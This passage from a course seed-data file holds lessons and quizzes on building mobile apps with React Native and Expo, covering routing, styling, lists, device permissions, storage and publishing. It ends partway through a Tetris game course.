      `**Expo** is a framework and set of tools built on top of React Native that makes building mobile apps with React dramatically simpler: no need to install Xcode or Android Studio to get started, a huge library of pre-built native modules (camera, location, notifications...), and a companion app (**Expo Go**) that runs your app on a real phone instantly, no cables required.\n\n## Bare React Native vs. Expo\n\n| | Bare React Native | Expo |\n|---|---|---|\n| Native project setup | Manual (Xcode/Android Studio) | Handled for you |\n| Native modules | Install & link manually | Huge built-in library (\`expo-camera\`, \`expo-location\`, ...) |\n| Running on a device | Cable + native build | Scan a QR code with Expo Go |\n| Ejecting to bare native code | N/A | Possible any time (\`expo prebuild\`) |\n\nExpo isn't a separate language, you're still writing React and JavaScript/TypeScript, just with a much smoother toolchain around it.\n\n## Creating your first app\n\n\`\`\`bash\nnpx create-expo-app my-app\ncd my-app\nnpx expo start\n\`\`\`\n\n\`npx expo start\` boots a development server and shows a QR code, scan it with the **Expo Go** app (iOS/Android) to run your app on a real device, or press \`i\`/\`a\` in the terminal to launch an iOS/Android simulator if you have one installed.\n\n## Project structure\n\n\`\`\`\nmy-app/\n  app/            # every file here is a screen (file-based routing, next lesson)\n    index.tsx\n    _layout.tsx\n  assets/         # images, fonts\n  app.json        # app name, icon, splash screen, permissions\n  package.json\n\`\`\`\n\n> [!NOTE]\n> Expo apps are still "just React", the core differences from web React are which **components** you use (\`<View>\` instead of \`<div>\`, \`<Text>\` instead of a raw string) and that there's no browser DOM underneath, everything renders to native platform views.`
    ),
    quiz: {
      title: 'Expo Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does Expo Go let you do?',
          options: [
            'Compile apps in the cloud only',
            'Run your app on a real device instantly by scanning a QR code',
            'Replace React with a different language',
            'Deploy directly to the app stores without review',
          ],
          answer: 'Run your app on a real device instantly by scanning a QR code',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Expo apps are written in a completely different language from web React.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Running npx expo ____ boots the development server and shows a QR code to scan.',
          options: [],
          answer: 'start',
        },
      ],
    },
  },
  {
    title: 'Navigation with Expo Router',
    content: lessonContent(
      'Navigation with Expo Router',
      `Modern Expo apps use **Expo Router**, a file-based routing system: the folder structure inside \`app/\` directly determines your app's screens and URLs, the same idea as Next.js, applied to mobile.\n\n## Basic routes\n\n\`\`\`\napp/\n  index.tsx        # the "/" screen (home)\n  profile.tsx       # the "/profile" screen\n  settings.tsx       # the "/settings" screen\n\`\`\`\n\n\`\`\`\n// app/profile.tsx\nimport { View, Text } from 'react-native';\n\nexport default function ProfileScreen() {\n  return (\n    <View>\n      <Text>Your profile</Text>\n    </View>\n  );\n}\n\`\`\`\n\nEach file just needs a default-exported component, Expo Router wires up the screen and navigation automatically, no manual route configuration.\n\n## Navigating between screens\n\n\`\`\`\nimport { Link, useRouter } from 'expo-router';\n\nexport default function HomeScreen() {\n  const router = useRouter();\n\n  return (\n    <View>\n      <Link href="/profile">Go to profile</Link>\n      <Button title="Go to settings" onPress={() => router.push('/settings')} />\n    </View>\n  );\n}\n\`\`\`\n\n\`<Link>\` works like an anchor tag, declarative navigation right in your JSX. \`useRouter()\` gives you an imperative API (\`router.push\`, \`router.back\`, \`router.replace\`) for navigating in response to code, like after a form submits successfully.\n\n## Dynamic routes\n\n\`\`\`\napp/\n  courses/\n    [id].tsx      # matches /courses/123, /courses/anything\n\`\`\`\n\n\`\`\`\n// app/courses/[id].tsx\nimport { useLocalSearchParams } from 'expo-router';\n\nexport default function CourseScreen() {\n  const { id } = useLocalSearchParams();\n  return <Text>Course {id}</Text>;\n}\n\`\`\`\n\nSquare brackets in a filename, \`[id].tsx\`, create a **dynamic segment**, \`useLocalSearchParams()\` reads whatever value matched that segment out of the current URL.\n\n## Layouts\n\nA special \`_layout.tsx\` file wraps every screen in the same folder, this is where you'd add a shared tab bar, header, or navigation container:\n\n\`\`\`\n// app/_layout.tsx\nimport { Stack } from 'expo-router';\n\nexport default function RootLayout() {\n  return <Stack />;\n}\n\`\`\``
    ),
    quiz: {
      title: 'Expo Router Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In Expo Router, what determines your app's screens?",
          options: [
            'A central routes.js config file',
            'The folder/file structure inside app/',
            'XML navigation files',
            'Manually calling registerScreen()',
          ],
          answer: 'The folder/file structure inside app/',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A filename like ____.tsx (with square brackets around the name) creates a dynamic route segment.',
          options: [],
          answer: '[id]',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A special _layout.tsx file lets every screen in that folder share the same wrapper, like a tab bar or header.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Styling with StyleSheet and Flexbox',
    content: lessonContent(
      'Styling with StyleSheet and Flexbox',
      `React Native has no CSS files or class names, styles are plain JavaScript objects, usually created with \`StyleSheet.create\`.\n\n## StyleSheet basics\n\n\`\`\`\nimport { View, Text, StyleSheet } from 'react-native';\n\nexport default function Card() {\n  return (\n    <View style={styles.card}>\n      <Text style={styles.title}>Kodstigen</Text>\n    </View>\n  );\n}\n\nconst styles = StyleSheet.create({\n  card: {\n    padding: 16,\n    borderRadius: 12,\n    backgroundColor: '#1e293b',\n  },\n  title: {\n    fontSize: 20,\n    fontWeight: 'bold',\n    color: 'white',\n  },\n});\n\`\`\`\n\n\`StyleSheet.create\` doesn't do anything magical at runtime, mainly it validates your style objects and lets React Native optimize how they're referenced, but functionally you can pass a plain object to \`style\` too.\n\n## Flexbox is the default layout system\n\nUnlike the web, where \`display: flex\` is opt-in, **every \`<View>\` in React Native lays out its children with Flexbox by default**, and \`flexDirection\` defaults to \`'column'\` (the opposite of the web's \`'row'\` default).\n\n\`\`\`\nconst styles = StyleSheet.create({\n  row: {\n    flexDirection: 'row',\n    justifyContent: 'space-between',\n    alignItems: 'center',\n    padding: 12,\n  },\n});\n\`\`\`\n\n## Combining and conditionally applying styles\n\nThe \`style\` prop accepts an **array** of styles, later ones override earlier ones, this is the standard way to conditionally apply an extra style:\n\n\`\`\`\n<View style={[styles.card, isActive && styles.cardActive]} />\n\`\`\`\n\n> [!TIP]\n> There's no CSS cascade or specificity to fight with, a component only ever gets the styles you explicitly pass to it, nothing leaks in from a parent or a global stylesheet.`
    ),
    quiz: {
      title: 'Styling & Flexbox Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the default flexDirection for a View in React Native?',
          options: ['row', 'column', 'row-reverse', 'none'],
          answer: 'column',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You must explicitly enable Flexbox with display: flex on every View, like on the web.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Passing an ____ of styles to the style prop lets later styles override earlier ones, useful for conditional styling.',
          options: [],
          answer: 'array',
        },
      ],
    },
  },
  {
    title: 'Handling User Input and State',
    content: lessonContent(
      'Handling User Input and State',
      `State management works exactly the same as web React (\`useState\`, \`useReducer\`), what changes are the native components you use to capture input.\n\n## Text input\n\n\`\`\`\nimport { useState } from 'react';\nimport { TextInput, View } from 'react-native';\n\nexport default function SearchBox() {\n  const [query, setQuery] = useState('');\n\n  return (\n    <View>\n      <TextInput\n        value={query}\n        onChangeText={setQuery}\n        placeholder="Search courses..."\n        style={{ borderWidth: 1, borderRadius: 8, padding: 10 }}\n      />\n    </View>\n  );\n}\n\`\`\`\n\nNote \`onChangeText\`, not \`onChange\`, React Native's \`TextInput\` hands your callback the new string directly, there's no \`event.target.value\` to unwrap like on the web.\n\n## Buttons and touchables\n\n\`\`\`\nimport { Pressable, Text } from 'react-native';\n\nfunction LikeButton({ onPress }) {\n  return (\n    <Pressable onPress={onPress} style={({ pressed }) => ({ opacity: pressed ? 0.6 : 1 })}>\n      <Text>❤️ Like</Text>\n    </Pressable>\n  );\n}\n\`\`\`\n\n\`Pressable\` is the modern, flexible way to make anything tappable, \`style\` can be a function that receives the current interaction state (\`pressed\`, \`hovered\` on web), letting you add feedback like a subtle opacity change without any extra state of your own.\n\n## Forms are just state\n\nThere's no \`<form onSubmit>\` on mobile, a "form" is just a collection of state variables and a button that reads them when pressed:\n\n\`\`\`\nfunction LoginForm() {\n  const [email, setEmail] = useState('');\n  const [password, setPassword] = useState('');\n\n  function handleSubmit() {\n    console.log('logging in with', email, password);\n  }\n\n  return (\n    <View>\n      <TextInput value={email} onChangeText={setEmail} placeholder="Email" />\n      <TextInput value={password} onChangeText={setPassword} placeholder="Password" secureTextEntry />\n      <Pressable onPress={handleSubmit}><Text>Log in</Text></Pressable>\n    </View>\n  );\n}\n\`\`\`\n\n\`secureTextEntry\` masks the input, the native equivalent of \`type="password"\`.`
    ),
    quiz: {
      title: 'Input & State Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which prop does TextInput use to react to typing, instead of onChange?',
          options: ['onInput', 'onChangeText', 'onKeyPress', 'onTextUpdate'],
          answer: 'onChangeText',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "TextInput's change handler receives the raw event object, and you must read event.target.value from it.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Setting ____ to true on a TextInput masks the typed characters, like a password field.',
          options: [],
          answer: 'secureTextEntry',
        },
      ],
    },
  },
  {
    title: 'Working with Lists: FlatList',
    content: lessonContent(
      'Working with Lists: FlatList',
      `You could render a list with \`.map()\` like on the web, but for anything beyond a handful of items, React Native gives you \`FlatList\`, a component built specifically for large, scrollable lists.\n\n## Why not just .map()?\n\n\`\`\`\n<ScrollView>\n  {courses.map((c) => <CourseRow key={c.id} course={c} />)}\n</ScrollView>\n\`\`\`\n\nThis renders **every single item immediately**, for a list of 5 that's fine, for a list of 5,000 it tanks performance and memory. \`FlatList\` only renders what's currently visible on screen (plus a small buffer), recycling views as the user scrolls.\n\n## Basic usage\n\n\`\`\`\nimport { FlatList, Text, View } from 'react-native';\n\nfunction CourseList({ courses }) {\n  return (\n    <FlatList\n      data={courses}\n      keyExtractor={(item) => item.id}\n      renderItem={({ item }) => (\n        <View style={{ padding: 12 }}>\n          <Text>{item.title}</Text>\n        </View>\n      )}\n    />\n  );\n}\n\`\`\`\n\n- \`data\` is the array to render.\n- \`keyExtractor\` is FlatList's equivalent of the \`key\` prop, a function returning a unique string id per item.\n- \`renderItem\` receives \`{ item, index }\` and returns the JSX for a single row.\n\n## Useful extras\n\n\`\`\`\n<FlatList\n  data={courses}\n  keyExtractor={(item) => item.id}\n  renderItem={renderCourse}\n  ListEmptyComponent={<Text>No courses yet.</Text>}\n  ListHeaderComponent={<Text>All Courses</Text>}\n  onEndReached={loadMoreCourses}\n  onEndReachedThreshold={0.5}\n  refreshing={isRefreshing}\n  onRefresh={reloadCourses}\n/>\n\`\`\`\n\n\`onEndReached\` fires when the user scrolls near the bottom, the standard hook for **infinite scroll**/pagination. \`refreshing\`/\`onRefresh\` wire up the native pull-to-refresh gesture for free.\n\n> [!WARNING]\n> Never nest a \`FlatList\` inside a \`ScrollView\` that scrolls in the same direction, both will try to own scrolling and you'll get janky, broken behavior. If you need multiple lists on one screen, give \`FlatList\` a fixed height or use \`ListHeaderComponent\`/\`ListFooterComponent\` to add content around a single list instead.`
    ),
    quiz: {
      title: 'FlatList Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why prefer FlatList over .map() inside a ScrollView for a large dataset?',
          options: [
            'FlatList looks nicer by default',
            'FlatList only renders visible items, saving memory and performance',
            'map() does not work at all in React Native',
            'FlatList is required for TypeScript support',
          ],
          answer: 'FlatList only renders visible items, saving memory and performance',
        },
        {
          type: 'FILL_BLANK',
          prompt: "FlatList's ____ prop is a function that returns a unique string id for each item, similar to a key.",
          options: [],
          answer: 'keyExtractor',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'It is safe to nest a FlatList inside a ScrollView that scrolls in the same direction.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Device APIs: Camera, Location, and Permissions',
    content: lessonContent(
      'Device APIs: Camera, Location, and Permissions',
      `One of Expo's biggest advantages is instant access to native device features through simple JavaScript APIs, no native code required. Nearly all of them follow the same **permission pattern**.\n\n## The permission pattern\n\n\`\`\`\nimport * as Location from 'expo-location';\n\nasync function getCurrentLocation() {\n  const { status } = await Location.requestForegroundPermissionsAsync();\n  if (status !== 'granted') {\n    console.log('Permission denied');\n    return null;\n  }\n  const location = await Location.getCurrentPositionAsync({});\n  return location.coords;\n}\n\`\`\`\n\nEvery device API works the same way: **request permission** (the OS shows a native prompt the first time), **check the result**, then use the API only if granted. Never assume permission, always request and check.\n\n## Using the camera\n\n\`\`\`\nimport { CameraView, useCameraPermissions } from 'expo-camera';\n\nfunction ScannerScreen() {\n  const [permission, requestPermission] = useCameraPermissions();\n\n  if (!permission) return null; // still loading\n  if (!permission.granted) {\n    return <Button title="Grant camera access" onPress={requestPermission} />;\n  }\n\n  return <CameraView style={{ flex: 1 }} />;\n}\n\`\`\`\n\n\`useCameraPermissions()\` is a hook version of the same request/check pattern, common for APIs used directly inside a component.\n\n## Declaring permissions in app.json\n\nSome permissions (especially on iOS) also need a usage description declared in \`app.json\`, explaining *why* your app wants access, shown to the user in the native permission dialog:\n\n\`\`\`\n{\n  "expo": {\n    "ios": {\n      "infoPlist": {\n        "NSCameraUsageDescription": "This app uses the camera to scan QR codes."\n      }\n    }\n  }\n}\n\`\`\`\n\n> [!NOTE]\n> Most of Expo's device modules (\`expo-camera\`, \`expo-location\`, \`expo-notifications\`, \`expo-contacts\`, ...) are separate packages you install individually with \`npx expo install expo-camera\`, using \`expo install\` instead of plain \`npm install\` ensures you get a version compatible with your Expo SDK version.`
    ),
    quiz: {
      title: 'Device APIs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the correct pattern for using a device API like the camera or location?',
          options: [
            'Use it directly, permissions are automatic',
            'Request permission, check the result, then use the API',
            'Only request permission if the app crashes first',
            'Permissions only apply to Android, not iOS',
          ],
          answer: 'Request permission, check the result, then use the API',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Use npx expo ____ (instead of plain npm install) to add a device API package compatible with your Expo SDK version.',
          options: [],
          answer: 'install',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'iOS usage-description strings for permissions like the camera are configured in app.json.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Data Persistence and Fetching',
    content: lessonContent(
      'Data Persistence and Fetching',
      `Mobile apps need two different kinds of data handling: fetching from a remote API (same \`fetch\`/\`useEffect\` pattern as web React), and persisting small bits of data locally so they survive an app restart.\n\n## Fetching data\n\n\`\`\`\nimport { useEffect, useState } from 'react';\n\nfunction useCourses() {\n  const [courses, setCourses] = useState([]);\n  const [loading, setLoading] = useState(true);\n\n  useEffect(() => {\n    fetch('https://api.example.com/courses')\n      .then((res) => res.json())\n      .then(setCourses)\n      .finally(() => setLoading(false));\n  }, []);\n\n  return { courses, loading };\n}\n\`\`\`\n\nThis is identical to fetching in web React, \`fetch\` and \`useEffect\` work exactly the same in React Native.\n\n## Persisting data with AsyncStorage\n\nThere's no browser \`localStorage\` on mobile, the equivalent is \`@react-native-async-storage/async-storage\`, an async key-value store.\n\n\`\`\`\nimport AsyncStorage from '@react-native-async-storage/async-storage';\n\nasync function saveDraft(text) {\n  await AsyncStorage.setItem('noteDraft', text);\n}\n\nasync function loadDraft() {\n  const value = await AsyncStorage.getItem('noteDraft');\n  return value ?? '';\n}\n\`\`\`\n\nEvery method is **async** and returns a Promise, unlike \`localStorage\`'s synchronous API, this matters when you're loading saved data on app startup, you'll typically do it inside a \`useEffect\` and show a loading state until it resolves.\n\n## Storing objects\n\n\`AsyncStorage\` only stores strings, so store objects as JSON:\n\n\`\`\`\nasync function saveTasks(tasks) {\n  await AsyncStorage.setItem('tasks', JSON.stringify(tasks));\n}\n\nasync function loadTasks() {\n  const raw = await AsyncStorage.getItem('tasks');\n  return raw ? JSON.parse(raw) : [];\n}\n\`\`\`\n\n> [!WARNING]\n> AsyncStorage is meant for small amounts of data (settings, drafts, a cached list), it is **not encrypted** and not meant for sensitive data like auth tokens, for those, use \`expo-secure-store\` instead, which stores values in the device's encrypted keychain.`
    ),
    quiz: {
      title: 'Persistence & Fetching Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What is the mobile equivalent of the web's localStorage?",
          options: ['sessionStorage', 'AsyncStorage', 'IndexedDB', 'cookies'],
          answer: 'AsyncStorage',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'AsyncStorage methods are synchronous, just like localStorage.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Since AsyncStorage only stores strings, objects must be serialized with JSON.____ before saving.',
          options: [],
          answer: 'stringify',
        },
      ],
    },
  },
  {
    title: 'Building and Publishing Your App',
    content: lessonContent(
      'Building and Publishing Your App',
      `Once your app works in Expo Go, the final step is producing a real, installable build, and eventually shipping it to the App Store / Google Play.\n\n## EAS Build\n\n**EAS (Expo Application Services)** builds native app binaries in the cloud, so you don't need a Mac to build an iOS app.\n\n\`\`\`bash\nnpm install -g eas-cli\neas login\neas build:configure\neas build --platform ios\neas build --platform android\n\`\`\`\n\n\`eas build:configure\` sets up an \`eas.json\` with build profiles (e.g. \`development\`, \`preview\`, \`production\`), each can produce a different kind of build, a quick internal test build vs. a production, store-ready one.\n\n## App configuration\n\nYour app's name, icon, splash screen, version, and bundle identifier all live in \`app.json\` (or \`app.config.js\` for dynamic config):\n\n\`\`\`\n{\n  "expo": {\n    "name": "Kodstigen Notes",\n    "slug": "kodstigen-notes",\n    "version": "1.0.0",\n    "icon": "./assets/icon.png",\n    "ios": { "bundleIdentifier": "com.kodstigen.notes" },\n    "android": { "package": "com.kodstigen.notes" }\n  }\n}\n\`\`\`\n\n## Submitting to the stores\n\n\`\`\`bash\neas submit --platform ios\neas submit --platform android\n\`\`\`\n\n\`eas submit\` uploads your latest build directly to App Store Connect / the Google Play Console, from there it goes through each store's normal review process, exactly like an app built without Expo at all.\n\n## Over-the-air updates\n\nFor JavaScript-only changes (no new native code), **EAS Update** can push a new version directly to users who already installed your app, skipping the app store review entirely:\n\n\`\`\`bash\neas update --branch production --message "Fix login bug"\n\`\`\`\n\n> [!NOTE]\n> OTA updates can only ship JavaScript/asset changes, if you add a new native dependency (like a new device API package), that requires a full new build submitted through the store again.`
    ),
    quiz: {
      title: 'Build & Publish Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does EAS Build let you do without owning a Mac?',
          options: ['Write Swift code', 'Build an iOS app binary in the cloud', 'Design app icons', 'Test on physical Android devices'],
          answer: 'Build an iOS app binary in the cloud',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'eas ____ uploads your latest build directly to the App Store or Google Play Console.',
          options: [],
          answer: 'submit',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An over-the-air (OTA) update can ship a brand-new native dependency without a new store submission.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Mobile Notes App with Expo',
    content: lessonContent(
      'Final Project: Build a Mobile Notes App with Expo',
      `Combine everything from this course into one real, working mobile app: a simple notes app you can run on your own phone with Expo Go.\n\n## Requirements\n\n1. Set up a new Expo project with Expo Router and at least two screens: a notes list screen and a note detail/edit screen, connected with file-based routing (a dynamic \`[id]\` route for viewing/editing a single note).\n2. Let the user create a new note (title + body) through a controlled form.\n3. Render the list of notes with \`FlatList\`, not \`.map()\`.\n4. Persist notes to the device with \`AsyncStorage\`, so they're still there after fully closing and reopening the app.\n5. Let the user delete a note, with a confirmation step (e.g. a native \`Alert.alert\` confirm dialog) before it's removed.\n6. Style the app with \`StyleSheet\`, at minimum a card-style note list and a clean editing screen.\n\n## Stretch goals\n\n- Add a search bar that filters the notes list as you type.\n- Add a timestamp to each note (created/last edited) using \`Date\`.\n- Request camera permission and let the user attach a photo to a note with \`expo-image-picker\`.\n- Build it with \`eas build\` and install the real binary on your phone instead of only running it through Expo Go.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const tetrisExpoLessons: SeedLesson[] = [
  {
    title: 'The Board and the Grid',
    content: lessonContent(
      'The Board and the Grid',
      `**Tetris** is a perfect second mobile project after the React-Expo course: it's built almost entirely from things you already know (state, \`useEffect\`, \`View\`/\`Text\`, touch handlers), just combined into a real-time game loop. This course builds the classic version from scratch: a 10x20 board, all 7 tetrominoes with rotation, gravity, touch controls, line-clearing, and scoring.\n\n## Modeling the board\n\nClassic Tetris uses a board 10 columns wide and 20 rows tall. Just like the Match-3 course's approach to a game board, keep it as plain data first, completely separate from how it's drawn:\n\n\`\`\`\nconst BOARD_WIDTH = 10;\nconst BOARD_HEIGHT = 20;\n\nfunction createEmptyBoard(): number[][] {\n  return Array.from({ length: BOARD_HEIGHT }, () => Array(BOARD_WIDTH).fill(0));\n}\n\`\`\`\n\nEach cell is a number: \`0\` means empty, any other value (1-7) identifies which tetromino color locked into that cell. \`Array.from({ length: BOARD_HEIGHT }, () => Array(BOARD_WIDTH).fill(0))\` is important here, not \`Array(BOARD_HEIGHT).fill(Array(BOARD_WIDTH).fill(0))\`, the latter would make every row **the same array reference**, mutating one row would silently mutate all of them. \`Array.from\` calls its callback fresh for every row, giving each one its own independent array.\n\n## Rendering the grid\n\n\`\`\`tsx\nimport { View, StyleSheet } from 'react-native';\n\nconst CELL_SIZE = 16;\n\nfunction Board({ board }: { board: number[][] }) {\n  return (\n    <View style={styles.board}>\n      {board.map((row, r) => (\n        <View key={r} style={styles.row}>\n          {row.map((cell, c) => (\n            <View key={c} style={[styles.cell, cell !== 0 && styles.filled]} />\n          ))}\n        </View>\n      ))}\n    </View>\n  );\n}\n\nconst styles = StyleSheet.create({\n  board: { borderWidth: 2, borderColor: '#334155' },\n  row: { flexDirection: 'row' },\n  cell: { width: CELL_SIZE, height: CELL_SIZE, borderWidth: 0.5, borderColor: '#1e293b' },\n  filled: { backgroundColor: '#38bdf8' },\n});\n\`\`\`\n\nEach row is a \`<View>\` with \`flexDirection: 'row'\`, stacked vertically by the outer \`<View>\`'s default \`flexDirection: 'column'\`, exactly how a 2D array naturally maps to nested flexbox rows and columns. \`cell !== 0 && styles.filled\` is a common React Native idiom: an array of styles where \`false\` entries are simply ignored, so a cell only gets the \`filled\` background when it's actually occupied.\n\n> [!NOTE]\n> This course builds on the React-Expo course's setup (\`npx create-expo-app\`, running on a device with Expo Go), and needs a real Expo project to run, it can't run in this course's browser sandbox. Treat it like the Kivy or Pygame projects: read, understand, and run the code on your own machine.`
    ),
    quiz: {
      title: 'The Board and the Grid Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does createEmptyBoard() use Array.from() instead of Array(BOARD_HEIGHT).fill(Array(BOARD_WIDTH).fill(0))?',
          options: [
            'Array.from() is faster to type',
            'fill() would make every row the same array reference, so mutating one row would mutate all of them',
            'Array.from() is required by React Native',
            "There's no real difference",
          ],
          answer: 'fill() would make every row the same array reference, so mutating one row would mutate all of them',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In the board array, a cell value of 0 means that cell is empty.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "cell !== 0 && styles.filled is a common React Native idiom: array style entries that are ____ are simply ignored.",
          options: [],
          answer: 'false',
        },
      ],
    },
  },
  {
    title: 'Tetromino Shapes and Rotation',
    content: lessonContent(
      'Tetromino Shapes and Rotation',
      `There are exactly 7 tetromino shapes (**I, O, T, S, Z, J, L**), each made of 4 connected squares. This lesson defines them as data, and writes the rotation logic every one of them shares.\n\n## Defining the shapes\n\nEach shape is a small matrix, \`1\` for a filled cell, \`0\` for empty:\n\n\`\`\`\ntype Matrix = number[][];\n\nconst SHAPES: Record<string, Matrix> = {\n  I: [[1, 1, 1, 1]],\n  O: [\n    [1, 1],\n    [1, 1],\n  ],\n  T: [\n    [0, 1, 0],\n    [1, 1, 1],\n  ],\n  S: [\n    [0, 1, 1],\n    [1, 1, 0],\n  ],\n  Z: [\n    [1, 1, 0],\n    [0, 1, 1],\n  ],\n  J: [\n    [1, 0, 0],\n    [1, 1, 1],\n  ],\n  L: [\n    [0, 0, 1],\n    [1, 1, 1],\n  ],\n};\n\nconst SHAPE_COLORS: Record<string, number> = { I: 1, O: 2, T: 3, S: 4, Z: 5, J: 6, L: 7 };\n\`\`\`\n\nThe \`SHAPE_COLORS\` map assigns each shape a number matching the board cell values from the last lesson, when a piece locks into the board, its cells get filled with this id, which the \`Board\` component's styling can later look up to pick a color per piece type.\n\n## Rotating a matrix 90°\n\n\`\`\`\nfunction rotate(matrix: Matrix): Matrix {\n  return matrix[0].map((_, col) => matrix.map((row) => row[col]).reverse());\n}\n\nconsole.log(rotate(SHAPES.L));\n// [0,0,1] [1,1,1]  ->  [1,0] [1,0] [1,1]\n\`\`\`\n\nThis single line is the standard "rotate a matrix 90° clockwise" trick: \`matrix.map((row) => row[col])\` reads down one **column** of the original matrix, turning it into a **row**, then \`.reverse()\` flips that row's order. Doing this for every column (\`matrix[0].map((_, col) => ...)\`, using the first row just to get the right number of columns to iterate) builds an entirely new, rotated matrix, the original \`matrix\` is never mutated.\n\n## Why this works for every shape, unchanged\n\nBecause \`rotate\` only ever looks at a matrix's dimensions, not which shape it represents, the exact same function correctly rotates the I-piece (1x4), the O-piece (2x2, visually unchanged by rotation, but the code doesn't need to know that), and every other shape. Calling \`rotate\` four times returns you to (approximately) the original orientation.\n\n> [!TIP]\n> The O-piece rotating "into itself" every time isn't a special case you need to write, it's just what naturally falls out of rotating a symmetric 2x2 matrix, one of the small satisfactions of representing shapes as plain data instead of hand-coding each shape's four rotations separately.`
    ),
    quiz: {
      title: 'Tetromino Shapes and Rotation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How many distinct tetromino shapes does classic Tetris use?',
          options: ['4', '5', '7', '10'],
          answer: '7',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The rotate() function needs a special case written for the O-piece so it rotates correctly.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The rotate() function reads down a column with map(), then calls .____() to flip that row\'s order.',
          options: [],
          answer: 'reverse',
        },
      ],
    },
  },
  {
    title: 'The Game Loop: Gravity and Collision',
    content: lessonContent(
      'The Game Loop: Gravity and Collision',
      `A static board and a rotatable shape aren't a game yet, they need to actually **fall**, and stop falling when they hit something. This lesson builds both.\n\n## Piece state\n\n\`\`\`\ninterface ActivePiece {\n  shape: Matrix;\n  shapeName: string;\n  row: number;\n  col: number;\n}\n\nfunction spawnPiece(shapeName: string): ActivePiece {\n  const shape = SHAPES[shapeName];\n  return {\n    shape,\n    shapeName,\n    row: 0,\n    col: Math.floor((BOARD_WIDTH - shape[0].length) / 2),\n  };\n}\n\`\`\`\n\n\`row\`/\`col\` track the piece's **top-left corner** on the board, everything about "where the piece is" lives in these two numbers plus its (possibly rotated) \`shape\` matrix. Centering the spawn column keeps every piece appearing in the middle of the board regardless of its width.\n\n## Collision detection\n\n\`\`\`\nfunction hasCollision(board: Matrix, piece: ActivePiece, row: number, col: number): boolean {\n  for (let r = 0; r < piece.shape.length; r++) {\n    for (let c = 0; c < piece.shape[r].length; c++) {\n      if (!piece.shape[r][c]) continue; // empty cell within the piece's bounding box\n\n      const boardRow = row + r;\n      const boardCol = col + c;\n      const outOfBounds = boardCol < 0 || boardCol >= BOARD_WIDTH || boardRow >= BOARD_HEIGHT;\n      const collidesWithLocked = boardRow >= 0 && board[boardRow][boardCol] !== 0;\n\n      if (outOfBounds || collidesWithLocked) return true;\n    }\n  }\n  return false;\n}\n\`\`\`\n\nThis checks a **hypothetical** position (\`row\`, \`col\`), not necessarily the piece's current one, that's deliberate: every move (left, right, rotate, down) works the same way, compute where the piece *would* end up, ask \`hasCollision\` whether that's legal, and only commit the move if it isn't. \`boardRow >= 0\` guards against checking above the board (pieces spawn partially off-screen while rotating near the top), where there's no board row to safely index into.\n\n## The falling tick\n\n\`\`\`tsx\nimport { useEffect, useState } from 'react';\n\nfunction useGameLoop(speedMs: number, onTick: () => void) {\n  useEffect(() => {\n    const interval = setInterval(onTick, speedMs);\n    return () => clearInterval(interval);\n  }, [speedMs, onTick]);\n}\n\`\`\`\n\n\`setInterval\` calls \`onTick\` (which will move the active piece down by one row) every \`speedMs\` milliseconds, this is Tetris's **gravity**. Returning \`clearInterval\` from \`useEffect\` is essential, without it, every re-render (or speed change) would start a *new* interval on top of the old one, stacking up multiple ticks firing simultaneously.\n\n> [!WARNING]\n> \`onTick\` needs to be stable across renders (wrapped in \`useCallback\`, covered in the next lesson) or this effect re-runs (clearing and restarting the interval) far more often than intended, since \`[speedMs, onTick]\` includes it as a dependency.`
    ),
    quiz: {
      title: 'Game Loop and Collision Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does hasCollision() check a hypothetical (row, col) instead of only the piece\'s current position?',
          options: [
            "It doesn't, it only checks the current position",
            'Every move (left/right/rotate/down) reuses the same function to test whether a proposed new position is legal before committing to it',
            'To make the board render faster',
            'Collision detection only matters when the piece is at the bottom',
          ],
